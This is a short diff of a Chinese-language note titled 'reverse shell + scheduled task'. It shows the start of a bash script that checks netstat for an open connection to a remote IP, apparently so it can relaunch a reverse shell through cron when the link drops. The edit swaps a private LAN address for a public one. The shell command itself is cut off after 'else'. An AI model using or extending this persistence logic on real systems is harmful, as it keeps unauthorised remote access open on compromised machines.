@@ -1,7 +1,7 @@
 反弹shell+计划任务
 ```
 #!/bin/bash
-if netstat -ano | grep -v grep | grep "192.168.1.30" > /dev/null
+if netstat -ano | grep -v grep | grep "106.52.199.83" > /dev/null
 then
 echo "OK" > /dev/null
 else
